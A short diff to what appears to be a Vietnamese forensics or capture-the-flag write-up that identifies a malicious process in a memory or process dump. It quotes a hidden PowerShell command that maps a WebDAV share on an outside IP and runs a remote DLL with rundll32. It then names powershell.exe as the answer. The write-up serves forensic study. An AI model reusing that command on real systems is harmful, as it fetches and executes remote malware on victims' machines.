@@ -21,7 +21,7 @@ Họ yêu cầu ta phải tìm ra malicious process và tên của nó, ở tron
 
 ``` 3692    powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry ```
 
-Lúc này, mình có thể confirm 100% đây là malicious activity. Vì mình có thể thấy rằng, attacker đang sử dụng powershell để map một IP nào đó và chạy dll32 để bypass lớp bảo vệ và tải về dll sus là 3435.dll và còn đang chạy hidden để cho không ai phát hiện.
+Lúc này, mình có thể confirm 100% đây là malicious activity. Vì mình có thể thấy rằng, attacker đang sử dụng powershell để map một IP nào đó và chạy dll32 để bypass lớp bảo vệ và tải về dll sus là 3435.dll và còn đang chạy hidden để cho không bị phát hiện
 
 -> Đáp án: powershell.exe
 
